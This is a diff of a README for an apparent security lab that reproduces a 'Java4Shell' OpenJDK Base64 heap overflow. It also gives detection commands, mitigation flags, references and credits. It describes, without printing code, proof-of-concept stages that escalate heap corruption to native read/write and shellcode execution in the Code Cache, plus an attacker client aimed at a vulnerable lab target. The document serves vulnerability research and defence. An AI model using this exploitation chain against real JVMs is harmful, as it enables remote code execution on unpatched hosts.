-| PoC | What it proves |
-|---|---|
-| `poc/Base64Trigger.java` | The intrinsic really performs the 64-byte masked store. The destination is 4 KiB, so all 62 overflow bytes stay inside a real array. |
-| `poc/HeapCorruption.java` | A 66-byte destination places the next array's length field at store offset 36. The length becomes `0x699AA669`, and a normal Java read at index 4096 succeeds. |
-| `poc/HeapLeak.java` | A neighbouring `secret` array is disclosed through ordinary Java reads on the now-huge victim. |
-| `poc/HeapWrite.java` | The same corrupted length turns ordinary Java stores into a chosen-value OOB write into a neighbouring array. |
-| `poc/Chain.java` | Writer → reader → forged header → repair. Establishes chosen-value linear write, heap disclosure, aliased object access, and GC survival. Heap-only by construction. |
-| `poc/NativeProbe.java` | Corrupts a `DirectByteBuffer.address` and demonstrates 64-bit native read/write with no Unsafe/JNI. Finds the field by oracle rather than a hardcoded offset. |
-| `poc/CodeCacheRce.java` | Scans the Code Cache for a compiled method's signature, overwrites it with shellcode, and invokes it. Prints `J4S-RCE-PWN` and exits 42. |
-| `poc/RceLab.java` | Deliberately vulnerable HTTP target: decode sink, corrupted session blob, and a maintenance hook that executes a recovered config string. |
-| `poc/RceClient.java` | Attacker client: fires the trigger, scans the heap through the corrupted length, and asks the target to execute the recovered command. |
-
-`HeapCorruption`, `HeapLeak`, and `HeapWrite` deliberately poison their own
-heap and call `Runtime.getRuntime().halt()` before GC can traverse the corrupted
-object. `Chain` repairs its headers and is GC-safe. Run all of them only in the
-disposable container.
-
-## Scope and limitations
-
-- **The chain reaches code execution.** `Chain.java` is heap-only by
-  construction. `NativeProbe.java` corrupts a `DirectByteBuffer.address` for a
-  64-bit native read/write with no Unsafe, JNI, or second bug.
-  `CodeCacheRce.java` then scans executable mappings for the compiled victim
-  method's signature, overwrites it with shellcode, and invokes it. The
-  shellcode writes `J4S-RCE-PWN` and exits with status 42.
-- **The Code Cache step is build-specific.** It relies on x86-64 instruction
-  encoding and finding a unique `movabs` constant; other JVMs, architectures or
-  inlining decisions need their own signature. That is an engineering
-  difference, not a missing primitive.
-- **Command execution uses an application sink.** The `rce` stage reaches
-  `ProcessBuilder` because `RceLab` contains a maintenance hook that runs a
-  config string from the session blob. The exploit moves attacker bytes into
-  that sink; it does not create the sink. This is a *different* path from the
-  native primitive above, and matches why Calif and VulnCheck call RCE
-  application-specific.
-- **No universal payload.** A real chain needs a reachable decoder, a suitable
-  heap layout, a live writer/reader pair or other feedback path, and
-  application-specific timing. Network conditions matter. The lab target is
-  shaped so one request can reach the sink; real products differ.
-- **Heap grooming is simplified here.** The pinned image gives deterministic
-  TLAB adjacency. Real targets need G1/TLAB grooming, region spraying,
-  request-parking, and retries.
-- **The smashing stages are disposable.** `corrupt`, `leak`, `write` and `rce`
-  do not repair their headers and halt or abandon the JVM by design. Only
-  `chain` performs repair and proves GC survival.
-- **SDE is CPU emulation, not bug emulation.** It spoofs an Ice Lake CPUID so
-  HotSpot generates the real AVX-512 stub; SDE executes the actual JVM machine
-  code.
-- **x86-64 Linux only.** The lab is `amd64`-only. Intel SDE/Pin does not work
-  under ARM-to-x86 emulation.
-
-## Detection
-
-Check the CPU gate and every JVM, including JDKs bundled inside products and
-container images:
+## Detecting affected hosts
 
 ```bash
 uname -m
 grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' \
   | grep -E '^(avx512f|avx512bw|avx512vbmi|bmi2)$'
 java -version
+jcmd <pid> VM.version          # exact build of a running JVM
 ```
 
-All four flags must be present. Also look for `hs_err_pid*` files and JVM exits
-with codes 134/139.
+Also look for `hs_err_pid*` files and JVM exits 134/139. Two cautions:
 
-Important:
-
-- Inside containers, `/proc/cpuinfo` reflects the host CPU. A safe node today
-  can be rescheduled onto a vulnerable CPU tomorrow; use CPU checks to
-  prioritize patching, not to dismiss findings.
-- Patching the host package does not update a JDK bundled inside a product or
-  image. Check each runtime separately.
+- Inside containers, `/proc/cpuinfo` reflects the **host** CPU. A node that is
+  safe today can be rescheduled onto a vulnerable one.
+- Patching the host package does not update a JDK **bundled** inside a product or
+  image. Audit each runtime separately.
 
 ## Mitigation
 
-1. **Patch and restart.** Upgrade to 17.0.21.1, 21.0.13.1, 25.0.5.1, or
-   27.0.1.1 (or the distributor's equivalent), then restart every JVM and
-   rebuild every image.
-2. **Temporary JVM flag** (either one disables the vulnerable path):
+1. **Patch and restart.** Upgrade to 17.0.21.1 / 21.0.13.1 / 25.0.5.1 /
+   27.0.1.1 (or the distributor's equivalent), then restart every JVM and rebuild
+   every image.
+2. **Temporary JVM flags** (either disables the vulnerable path):
    ```bash
    -XX:-UseBASE64Intrinsics
-   # or, on x86-64 only:
-   -XX:UseAVX=2
+   -XX:UseAVX=2          # x86-64 only; ARM JVMs reject this flag
    ```
-   `UseAVX` is x86-only; on ARM the JVM fails to start with
-   `Unrecognized VM option 'UseAVX=2'`.
-3. **Application input check.** Reject Base64 whose length, after stripping
-   whitespace, is not a multiple of 4 before calling `decode`. This blocks the
-   trigger but is not a general fix for every decoder route.
-4. **WAF signatures** are supplementary; they do not repair the runtime.
-5. **If you were exposed, assume compromise.** Patching does not undo a
-   successful heap disclosure or RCE. Review JVM crashes, unexpected
-   processes, and secrets that may have been in the heap.
+3. **Reject malformed Base64** whose length (after stripping whitespace) is not a
+   multiple of 4, before calling `decode`. This blocks the known trigger but is
+   not a general fix for every decoder route.
+4. **WAF rules** are supplementary; they do not repair the runtime.
+5. **Assume compromise if exposed.** Patching does not undo a successful heap
+   disclosure or code execution. Rotate secrets that may have been in the heap.
 
 ## Cleanup
 
@@ -666,46 +349,31 @@ docker image rm java4shell-lab:local
 docker compose down --rmi local --volumes
 ```
 
-The build downloads SDE from Intel's mirror and verifies SHA256. SDE is Intel
-software under the Intel Simplified Software License; it is downloaded at build
-time and is not redistributed by this repository.
+SDE is Intel software under the Intel Simplified Software License. It is
+downloaded at build time and is not redistributed here.
 
-## Repository layout
-
-```text
-Dockerfile              pinned vulnerable Temurin + SHA256-verified SDE
-run.sh                  plain-Docker launcher
-scripts/run-lab.sh      stage runner (native / SDE / auto)
-poc/Base64Trigger.java  bounded, non-destructive trigger
-poc/HeapCorruption.java length corruption + OOB read
-poc/HeapLeak.java       JavaBleed-style heap disclosure
-poc/HeapWrite.java      chosen-value OOB write
-poc/Chain.java          writer -> reader -> forge -> repair (second half)
-poc/NativeProbe.java    corrupted buffer address -> native read/write
-poc/CodeCacheRce.java   Code Cache overwrite -> shellcode execution
-poc/RceLab.java         vulnerable HTTP target for the RCE stage
-poc/RceClient.java      attacker client for the RCE stage
-compose.yaml            optional Compose configuration
-```
+---
 
 ## References
 
-- JFrog Security Research: [Java4Shell: What We Know About the Critical OpenJDK RCE Vulnerability](https://research.jfrog.com/post/java4shell-vulnerability/)
-- Calif technical write-up and PoC: [Java4Shell: Write once, RCE everywhere](https://calif.io/java4shell/)
-- OpenJDK advisory (2026-11-17): <https://openjdk.org/groups/vulnerability/advisories/2026-11-17>
-- Oracle Critical Security Patch Update (November 2026): <https://www.oracle.com/security-alerts/cspunov2026.html>
-- NVD: <https://nvd.nist.gov/vuln/detail/CVE-2026-114938>
-- CVE record: <https://www.cve.org/CVERecord?id=CVE-2026-114938>
+- Calif technical write-up and original PoC — <https://calif.io/java4shell/>
+- JFrog research summary — <https://research.jfrog.com/post/java4shell-vulnerability/>
+- Tenable FAQ — <https://www.tenable.com/blog/java4shell-cve-2026-114938-frequently-asked-questions-about-openjdk-rce-vulnerability>
+- OpenJDK advisory 2026-11-17 — <https://openjdk.org/groups/vulnerability/advisories/2026-11-17>
+- Oracle CSPU November 2026 — <https://www.oracle.com/security-alerts/cspunov2026.html>
+- NVD — <https://nvd.nist.gov/vuln/detail/CVE-2026-114938>
+- CVE record — <https://www.cve.org/CVERecord?id=CVE-2026-114938>
+- Upstream fix — <https://github.com/openjdk/jdk/commit/5177a70b385c16f26ede191fdac7aaba0bed0f8b>
 
 ## Credits and licensing
 
-- Vulnerability research, technical write-up, and the original bounded trigger
-  PoC: **Quang Luong / Calif**.
-- Original bug report and root-cause analysis: **sundarms** and
-  **albertnetymk** (per Calif's disclosure timeline).
-- Lab containerization and heap-corruption PoCs: repository owner.
+- Vulnerability research, write-up and the original bounded trigger:
+  **Quang Luong / Calif**.
+- Independent rediscovery and G1 grooming analysis: **Chainguard**.
+- Lab containerisation, heap-exploitation chain, native primitive and Code Cache
+  stage: **Akshut Goyal**.
 
-No open-source license has been specified for this repository. The bounded
-trigger follows the publicly published PoC in Calif's write-up; credit for that
-work belongs to Calif. Add a license only after confirming the terms of all
-referenced material.
+Licensed under the **MIT License** — see [LICENSE](LICENSE). The licence covers
+this repository's original code. The bounded trigger follows Calif's published
+PoC; credit for that work belongs to Calif. Intel SDE is not redistributed and
+remains under Intel's own licence.
